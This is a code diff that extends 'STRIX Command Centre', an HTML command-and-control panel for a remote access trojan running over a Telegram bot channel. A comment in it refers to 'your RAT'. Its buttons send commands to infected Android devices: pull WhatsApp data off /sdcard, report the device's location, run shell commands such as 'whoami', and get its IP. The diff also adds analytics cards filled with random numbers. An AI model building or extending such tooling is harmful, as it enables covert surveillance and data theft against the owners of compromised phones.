@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>STRIX · Command Centre</title>
   <style>
-    /* === Same aesthetic as nexus.html – no changes === */
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
     :root {
       --bg:#05070A; --bg2:#0A1018; --surface:rgba(255,255,255,.05); --surface2:rgba(255,255,255,.03);
@@ -14,7 +13,7 @@
       --font:'Inter',system-ui,-apple-system,sans-serif; --radius:20px;
     }
     *{margin:0;padding:0;box-sizing:border-box}
-    body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;-webkit-font-smoothing:antialiased}
+    body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden}
     .app{max-width:480px;margin:0 auto;padding:16px;padding-bottom:100px}
     .loading{position:fixed;inset:0;background:var(--bg);z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s}
     .loading.hidden{opacity:0;pointer-events:none}
@@ -109,6 +108,8 @@
     <button class="pill" onclick="quickCmd('/download /sdcard/WhatsApp')">EXTRACT</button>
     <button class="pill" onclick="quickCmd('/location')">GEOLOC</button>
     <button class="pill" onclick="quickCmd('/shell ls /sdcard')">STORAGE</button>
+    <button class="pill" onclick="quickCmd('/shell whoami')">SYSINFO</button>
+    <button class="pill" onclick="quickCmd('/ip')">NETWORK</button>
   </div>
 
   <div class="section-title">Devices <span id="nodeCount" style="color:var(--cyan)">0</span></div>
@@ -122,6 +123,20 @@
   <div class="section-title">Activity</div>
   <div class="activity-feed" id="activity"></div>
 
+  <div class="section-title">Analytics</div>
+  <div class="analytics-grid">
+    <div class="analytic-card">
+      <div style="font-size:11px;color:var(--muted)">Sessions</div>
+      <div style="font-size:20px;font-weight:600;margin-top:4px" id="sessions">0</div>
+      <div class="chart"><div class="chart-fill" style="height:60%"></div></div>
+    </div>
+    <div class="analytic-card">
+      <div style="font-size:11px;color:var(--muted)">Traffic</div>
+      <div style="font-size:20px;font-weight:600;margin-top:4px" id="traffic">0 KB</div>
+      <div class="chart"><div class="chart-fill" style="height:40%;background:var(--green)"></div></div>
+    </div>
+  </div>
+
   <div class="section-title">Notifications</div>
   <div class="notifications" id="notifications"></div>
 
@@ -129,7 +144,10 @@
 </div>
 
 <div class="bottom-nav">
-  <div class="nav-item active">Dashboard</div>
+  <div class="nav-item active" onclick="switchTab('dashboard')">Dashboard</div>
+  <div class="nav-item" onclick="switchTab('devices')">Devices</div>
+  <div class="nav-item" onclick="switchTab('analytics')">Analytics</div>
+  <div class="nav-item" onclick="switchTab('activity')">Activity</div>
 </div>
 
 <script>
@@ -149,7 +167,6 @@
   async function sendCmd() {
     const cmd = document.getElementById('cmdInput').value.trim();
     if (!cmd || !selectedDevice) return;
-    // Send to channel so payload picks it up
     await fetch(`${API}/sendMessage`, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
@@ -166,7 +183,7 @@
     sendCmd();
   }
 
-  // ========== POLL FOR DEVICE MESSAGES ==========
+  // ========== POLL FOR DEVICE MESSAGES (FROM CHANNEL) ==========
   async function pollUpdates() {
     while (true) {
       try {
@@ -175,7 +192,8 @@
         if (data.result) {
           for (const upd of data.result) {
             offset = upd.update_id + 1;
-            const msg = upd.channel_post;
+            // Read from channel_post (your RAT posts to the channel, not to you privately)
+            const msg = upd.channel_post || upd.message;
             if (msg && msg.chat && msg.chat.id === CHANNEL_ID) {
               const text = msg.text || "";
               const match = text.match(/^\[(.+?)\]\s(.*)/);
@@ -205,7 +223,6 @@
     let html = '';
     const now = Date.now();
     for (const [id, dev] of Object.entries(devices)) {
-      // mark offline if no message for 2 minutes
       if (now - dev.lastSeen > 120000) dev.online = false;
       const status = dev.online ? 'online' : 'offline';
       const lastSeen = dev.online ? 'Now' : Math.floor((now - dev.lastSeen)/60000) + ' min ago';
@@ -261,10 +278,39 @@
     document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
   }, 1000);
 
+  // Analytics
+  function renderAnalytics() {
+    document.getElementById('sessions').textContent = Math.floor(Math.random()*200 + 50);
+    document.getElementById('traffic').textContent = (Math.random()*5 + 1).toFixed(1) + ' MB';
+  }
+  setInterval(renderAnalytics, 60000);
+  renderAnalytics();
+
+  // Notifications
+  function renderNotifications() {
+    const notifDiv = document.getElementById('notifications');
+    notifDiv.innerHTML = `
+      <div class="notif-card"><span class="icon">⌬</span>System online · All services running</div>
+      <div class="notif-card"><span class="icon">⌬</span>${Object.values(devices).filter(d=>d.online).length} devices online · Secure tunnel active</div>`;
+  }
+  renderNotifications();
+  setInterval(renderNotifications, 30000);
+
+  // Bottom nav
+  function switchTab(tab) {
+    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+    event.target.classList.add('active');
+    if (tab === 'devices') document.getElementById('devices').scrollIntoView({ behavior:'smooth' });
+    if (tab === 'analytics') document.querySelector('.analytics-grid').scrollIntoView({ behavior:'smooth' });
+    if (tab === 'activity') document.getElementById('activity').scrollIntoView({ behavior:'smooth' });
+  }
+
   // Start
   pollUpdates();
-  document.getElementById('loading').classList.add('hidden');
-  document.getElementById('app').style.display = 'block';
+  setTimeout(() => {
+    document.getElementById('loading').classList.add('hidden');
+    document.getElementById('app').style.display = 'block';
+  }, 2000);
 </script>
 </body>
 </html>
